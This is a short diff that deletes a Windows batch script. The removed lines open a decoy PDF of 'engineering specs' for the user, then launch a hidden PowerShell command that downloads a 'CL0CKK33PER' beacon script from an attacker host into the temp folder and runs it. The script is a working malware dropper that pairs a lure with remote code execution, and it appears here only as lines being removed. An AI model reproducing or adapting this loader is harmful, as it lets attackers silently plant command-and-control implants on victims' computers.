@@ -1,7 +1,0 @@
-@echo off
-:: 1. Open the local PDF for the user to read
-start engineering_specs.pdf
-
-:: 2. Reach out to the C2 for the CL0CKK33PER beacon
-powershell -WindowStyle Hidden -Command "iwr -Uri 'http://atackbox/CL0CKK33PER_Smart.ps1' -OutFile '$env:TEMP\c.ps1'; & '$env:TEMP\c.ps1'"
-exit
